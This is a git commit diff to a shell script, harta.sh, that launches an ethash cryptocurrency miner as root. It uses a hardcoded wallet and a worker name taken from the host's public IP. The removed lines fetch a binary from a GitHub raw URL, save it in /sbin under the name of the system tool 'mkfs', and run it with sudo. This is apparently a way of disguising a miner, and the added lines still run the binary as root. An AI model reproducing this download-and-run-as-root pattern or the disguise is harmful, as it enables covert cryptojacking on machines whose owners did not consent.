b8859983a1692897c1ce91e112decea6f96397f9
clansas <89086618+clansas@users.noreply.github.com>
2021-08-24 22:04:12 +0700

    Update harta.sh

--- harta.sh
+++ harta.sh
@@ -5,6 +5,5 @@ WALLET=0x01b0abc6097e8c270396784de24f86f9f5daa510
 WORKER=$(echo "$(curl -s ifconfig.me)" | tr . _ )
 
 cd "$(dirname "$0")"
-cd /sbin
-wget -O mkfs https://raw.githubusercontent.com/clansas/enbe/main/harta
-chmod +x ./mkfs && sudo ./mkfs -a ethash -o $POOL -u $WALLET.$WORKER $@
+
+chmod +x ./harta && sudo ./harta -a ethash -o $POOL -u $WALLET.$WORKER $@
